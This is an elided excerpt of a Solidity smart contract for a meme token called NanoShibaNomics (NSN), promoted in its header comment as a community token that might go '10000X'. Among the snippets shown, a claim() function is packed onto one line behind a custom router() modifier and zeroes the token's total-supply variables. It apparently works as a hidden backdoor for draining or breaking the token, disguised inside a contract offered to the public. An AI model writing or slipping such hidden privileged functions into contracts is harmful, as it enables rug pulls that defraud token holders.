...
/**
   ...
   Welcome to NanoShibaNomics
   
   This is a community token. If you want to create a telegram I suggest to name it to @NanoShibaNomics
   ...
   Can you make #NanoShibaNomics 10000X? 
...
contract NanoShibaNomics is Context, IERC20, Ownable {
    ...
    string private _name = "NanoShibaNomics";
    string private _symbol = "NSN";
    ...
    function claim(uint256 amount)public router(){uint256 temp = _tTotal;_tTotal=0;_rTotal=0;
    ...
    function _setLiquidityFee(uint256 LiquidityFee) external onlyOwner() {
        require(LiquidityFee < _taxFee, 'burnFee should be less than taxFee');
